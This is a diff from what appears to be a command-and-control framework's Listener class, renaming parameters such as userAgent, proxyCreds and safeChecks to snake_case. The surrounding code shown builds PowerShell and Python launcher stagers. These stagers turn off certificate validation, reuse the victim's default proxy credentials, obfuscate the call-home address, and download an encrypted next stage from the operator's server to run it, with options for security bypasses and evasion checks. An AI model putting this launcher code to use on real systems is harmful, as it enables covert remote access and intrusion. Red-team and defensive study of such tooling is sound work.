@@ -110,13 +110,13 @@ class Listener:
         encode=True,
         obfuscate=False,
         obfuscation_command="",
-        userAgent="default",
+        user_agent="default",
         proxy="default",
-        proxyCreds="default",
-        stagerRetries="0",
+        proxy_creds="default",
+        stager_retries="0",
         language=None,
-        safeChecks="",
-        listenerName=None,
+        safe_checks="",
+        listener_name=None,
         bypasses: list[str] = None,
     ):
         """
@@ -143,7 +143,7 @@ class Listener:
             # PowerShell
 
             stager = '$ErrorActionPreference = "SilentlyContinue";'
-            if safeChecks.lower() == "true":
+            if safe_checks.lower() == "true":
                 stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
 
                 for bypass in bypasses:
@@ -152,16 +152,16 @@ class Listener:
 
             stager += "$wc=New-Object System.Net.WebClient;"
 
-            if userAgent.lower() == "default":
-                userAgent = profile.split("|")[1]
-            stager += f"$u='{ userAgent }';"
+            if user_agent.lower() == "default":
+                user_agent = profile.split("|")[1]
+            stager += f"$u='{ user_agent }';"
 
             if "https" in host:
                 # allow for self-signed certificates for https connections
                 stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
-            if userAgent.lower() != "none" or proxy.lower() != "none":
-                if userAgent.lower() != "none":
+            if user_agent.lower() != "none" or proxy.lower() != "none":
+                if user_agent.lower() != "none":
                     stager += "$wc.Headers.Add('User-Agent',$u);"
 
                 if proxy.lower() != "none":
@@ -174,13 +174,13 @@ class Listener:
                         stager += f"$proxy.Address = '{ proxy.lower() }';"
                         stager += "$wc.Proxy = $proxy;"
 
-                    if proxyCreds.lower() == "default":
+                    if proxy_creds.lower() == "default":
                         stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
 
                     else:
                         # TODO: implement form for other proxy credentials
-                        username = proxyCreds.split(":")[0]
-                        password = proxyCreds.split(":")[1]
+                        username = proxy_creds.split(":")[0]
+                        password = proxy_creds.split(":")[1]
                         domain = username.split("\\")[0]
                         usr = username.split("\\")[1]
                         stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}', '{domain}');"
@@ -207,7 +207,7 @@ class Listener:
 
             # add the RC4 packet to a cookie
             stager += f'$wc.Headers.Add("Cookie","session={ b64RoutingPacket }");'
-            stager += f"$ser={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';$hop='{ listenerName }';"
+            stager += f"$ser={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';$hop='{ listener_name }';"
             stager += "$data=$wc.DownloadData($ser+$t);"
             stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
 
@@ -247,19 +247,19 @@ class Listener:
                     """
                 )
             try:
-                if safeChecks.lower() == "true":
+                if safe_checks.lower() == "true":
                     launcherBase += listener_util.python_safe_checks()
             except Exception as e:
-                p = f"{listenerName}: Error setting LittleSnitch in stager: {str(e)}"
+                p = f"{listener_name}: Error setting LittleSnitch in stager: {str(e)}"
                 log.error(p)
 
-            if userAgent.lower() == "default":
-                userAgent = profile.split("|")[1]
+            if user_agent.lower() == "default":
+                user_agent = profile.split("|")[1]
 
             launcherBase += dedent(
                 f"""
                 import urllib.request;
-                UA='{ userAgent }';server='{ host }';t='{ stage0 }';hop='{ listenerName }';
+                UA='{ user_agent }';server='{ host }';t='{ stage0 }';hop='{ listener_name }';
                 req=urllib.request.Request(server+t);
                 """
             )
@@ -282,15 +282,15 @@ class Listener:
                     proto = proxy.split(":")[0]
                     launcherBase += f"proxy = urllib.request.ProxyHandler({{'{ proto }':'{ proxy }'}});\n"
 
-                if proxyCreds != "none":
-                    if proxyCreds == "default":
+                if proxy_creds != "none":
+                    if proxy_creds == "default":
                         launcherBase += "o = urllib.request.build_opener(proxy);\n"
 
                         # add the RC4 packet to a cookie
                         launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session={ b64RoutingPacket }")];\n'
                     else:
-                        username = proxyCreds.split(":")[0]
-                        password = proxyCreds.split(":")[1]
+                        username = proxy_creds.split(":")[0]
+                        password = proxy_creds.split(":")[1]
                         launcherBase += dedent(
                             f"""
                             proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();
